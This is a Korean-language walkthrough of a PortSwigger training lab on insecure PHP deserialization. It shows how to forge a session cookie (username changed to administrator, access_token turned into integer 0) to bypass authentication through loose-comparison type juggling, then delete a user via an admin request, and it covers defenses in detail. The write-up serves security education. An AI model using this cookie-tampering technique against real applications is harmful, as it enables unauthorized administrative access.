# Lab: Modifying serialized data types

## 개요

- **난이도**: Apprentice
- **주제**: Insecure Deserialization — PHP 직렬화 객체 타입 변조 / Type Juggling / 인증 우회(Authentication Bypass)
- **링크**: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

## 목표

세션 쿠키의 **직렬화 객체를 수정**해 `administrator` 계정으로 접근(인증 우회)하고, 사용자 `carlos` 를 삭제한다.

- 계정: `wiener:peter`
- 힌트: 서로 다른 타입의 값을 비교하는 PHP 의 특성(quirk)을 이용해야 한다. **PHP 7.x 이하**의 비교 동작을 가정한다.

## 배경 개념 — 직렬화 포맷 복습 + "길이 접두어"

이전 랩(001)과 동일하게 세션 쿠키는 PHP 직렬화 객체가 Base64 인코딩된 형태다.
이번 랩의 핵심은 **속성값을 바꿀 때 "길이 접두어(length prefix)" 도 함께 갱신**해야 한다는 점이다.

```
[로그인 직후 객체(개념도)]
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"<32바이트 토큰>";}

  O:4:"User"    클래스명 "User" (4글자)
  :2:           속성 2개
  s:8:"username";      속성명 "username" (8글자)
  s:6:"wiener";        값 "wiener" (6글자) ← 길이 6
  s:12:"access_token"; 속성명 "access_token" (12글자)
  s:32:"....";         32바이트 토큰 문자열
```

```
[왜 길이를 같이 바꿔야 하는가]
  PHP unserialize() 는 "선언된 길이" 만큼 읽는다.
  username 값을 wiener(6) → administrator(13) 로 바꾸면
  반드시 s:6 → s:13 으로 갱신해야 파서가 객체를 제대로 복원한다.
  (길이가 어긋나면 파싱이 밀려 이후 구조가 깨진다)
```

## 취약 지점 — PHP 의 느슨한 비교(==)와 타입 저글링

```
[PHP 비교 연산자]
  ==   느슨한 비교(loose)  → 값만 비교, 필요 시 타입을 자동 변환(type juggling)
  ===  엄격한 비교(strict) → 값 + 타입 모두 비교

[문제의 quirk — PHP 7 이하]
  숫자와 "숫자가 아닌 문자열" 을 == 로 비교하면
  문자열을 숫자 0 으로 변환한 뒤 비교한다.

    0 == "non-numeric-string"   →  true   (PHP 7 이하)   ← 이 랩의 핵심
    0 == "non-numeric-string"   →  false  (PHP 8+)       ← 동작 변경됨

[앱의 인증 로직(개념)]
  직렬화 객체의 access_token 을 신뢰해 인증을 판단:
    if ($user->access_token == $stored_token) { /* 로그인 */ }
  access_token 을 정수 0(i:0)으로 바꾸면
    조건이 0 == "<숫자 아님 토큰>" 이 되어 PHP 7 에서 true → 인증 우회
```

즉, 값뿐 아니라 **타입 자체를 클라이언트가 정할 수 있다**는 점이 근본 원인이다.

## 공격 단계

### 1단계 — 세션 쿠키 디코딩

`wiener:peter` 로그인 후 `GET /my-account` 요청의 세션 쿠키를 Burp Inspector 로 디코딩한다.
직렬화된 `User` 객체와 `access_token` 속성을 확인하고, 요청을 Repeater 로 보낸다.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"<토큰>";}
```

### 2단계 — 세 가지를 동시에 수정

Inspector 에서 다음을 바꾼다.

```
1) username 속성의 "길이" 를 6 → 13 으로 갱신   (s:6 → s:13)
2) username 값 "wiener" → "administrator"
3) access_token 을 문자열(s) → 정수(i) 0 으로 타입 변조
   - 값에 따옴표가 더 이상 필요 없으므로 제거
   - 타입 지정자 s → i 로 교체
```

```
[변경 전]
s:8:"username";s:6:"wiener";
s:12:"access_token";s:32:"<토큰>";

[변경 후]
s:8:"username";s:13:"administrator";
s:12:"access_token";i:0;
```

최종 결과:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

### 3단계 — 적용 및 관리자 접근

"Apply changes" 로 재인코딩하고 전송한다.
응답에 `/admin` 링크가 나타나면 `administrator` 로 인증 우회 성공이다.

### 4단계 — carlos 삭제

```
GET /admin/delete?username=carlos HTTP/1.1
Cookie: session=<변조된 직렬화 객체>
```

## 직렬화 객체 파싱 — 방어 관점 조사

### 1. 길이 접두어(length prefix)는 파서의 신뢰 지점

```
PHP 는 문자열마다 "바이트 길이" 를 먼저 선언한다. (s:13:"administrator";)
  - 파서는 선언된 길이만큼만 읽고 다음 토큰으로 넘어간다.
  - 값 길이와 선언 길이가 다르면 객체 구조가 어긋난다.
  - 멀티바이트(UTF-8) 문자는 "바이트 수" 기준임에 주의.
[방어적 시사점]
  "값만 바꾸면 되는" 데이터가 아니라, 파싱 구조 자체가 조작의 대상이다.
  따라서 직렬화 포맷을 사용자 입력 경계로 삼는 것 자체가 위험하다.
```

### 2. 타입 지정자도 클라이언트가 정한다 → Type Juggling

```
속성값의 타입을 공격자가 임의로 바꿀 수 있다.
  s:... (string)  ↔  i:... (int)  ↔  b:0/1 (bool)  ↔  d:... (float)

이것이 위험한 이유는, 역직렬화 이후의 애플리케이션 로직이
"타입까지 검증하지 않는" 느슨한 비교(==)를 쓰면 우회되기 때문이다.
```

```
[대표적인 PHP quirk 정리]
  0 == "abc"           → true  (PHP 7 이하; PHP 8 에서 false)   ← 이 랩
  "" == 0              → true
  "0e123" == "0e456"   → true  (둘 다 0 으로 해석; "magic hash")
  null == false == ""  → true
[방어적 시사점]
  - 복원된 값은 타입까지 엄격하게 검증/비교해야 한다 (=== / !==, is_int 등).
  - 인증/인가에 쓰이는 값은 클라이언트 직렬화 데이터에서 가져오지 않는다.
  - 언어/런타임 버전마다 비교 동작이 다르므로 버전 의존 로직을 피한다.
```

### 3. 신뢰 경계와 무결성 부재

```
이 랩은 001 과 동일한 구조적 결함을 공유한다.
  1) 인가 상태(어떤 사용자인지, 토큰)를 클라이언트 쿠키에 직렬화해 저장
  2) 서버가 그 객체를 그대로 역직렬화해 신뢰
  3) 무결성 검증(서명/HMAC)과 타입 제약이 없음
 → 값(001)이든 타입(002)이든, 조작 가능한 클라이언트 데이터로 인증을 판단하는 순간 우회된다.
```

## 방어

```
[근본 원칙]
  신뢰할 수 없는 입력을 직렬화 포맷으로 역직렬화하지 않는다.
  인증/인가 상태는 절대 클라이언트 직렬화 데이터에 두지 않는다.

[구체적 방어]
  1. 서버 측 세션
     - 신원/권한/토큰은 서버 저장소에 두고, 쿠키에는 무의미한 세션 ID 만.
     - 매 요청 서버에서 사용자 정보를 조회해 판단.

  2. 엄격한 타입 검사 (Type Juggling 방지)
     - 복원된 값은 타입 화이트리스트로 검증 (is_int, is_string ...).
     - 비교는 반드시 === / !==, hash_equals() 등 사용.
     - 인증 토큰 비교에는 타이밍 안전 비교 함수 사용.

  3. 안전한 데이터 포맷
     - 직렬화 대신 JSON 등 데이터 전용 포맷 + 엄격한 스키마 검증.

  4. 역직렬화 제한 (PHP)
     - unserialize($data, ['allowed_classes' => false]) 또는 허용 클래스 화이트리스트.
     - 사용자 입력을 오토로딩 경로에 태우지 않는다.

  5. 무결성 보증
     - 직렬화 데이터가 꼭 필요하면 서버 비밀키로 HMAC/서명 → 변조 시 거부.

  6. 런타임/의존성 관리
     - PHP 8+ 로 상향해 비교 동작 변경을 반영, 의존성 최신 유지(gadget chain 완화).
```

## 핵심 정리

- 세션 쿠키의 PHP 직렬화 객체에서 `username`(wiener→administrator)과 `access_token` 의 **타입**(문자열→정수 0)을 변조했다.
- `username` 값을 바꾸면서 길이 접두어(`s:6`→`s:13`)도 함께 갱신해야 했다.
- 앱이 `access_token` 을 느슨한 비교(==)로 검증해, PHP 7 이하에서 `0 == "<숫자 아님 문자열>"` 이 true 가 되는 quirk 로 인증이 우회됐다.
- 001 과 마찬가지로 근본 원인은 "조작 가능한 클라이언트 직렬화 데이터로 인가를 판단" 한 것이며, 방어는 서버 측 세션 + 엄격 타입 검사 + 무결성 보증이다.

## 배운 점

- 직렬화 포맷에서는 값뿐 아니라 **타입 지정자**와 **길이 접두어**도 공격면이다. 값을 바꾸면 길이를 반드시 맞춰야 한다.
- PHP 의 `==` 타입 저글링(특히 `0 == "문자열"`)은 인증 우회로 직결될 수 있고, PHP 7 과 8 에서 동작이 다르다.
- 인가/인증 판단에 클라이언트가 조작 가능한 값을 쓰면, 값 검증(001)이든 타입 검증(002)이든 결국 우회된다.
- 방어의 핵심은 ① 서버 측 세션 ② `===`/엄격 타입 검사 ③ 안전한 포맷/무결성 서명이다.
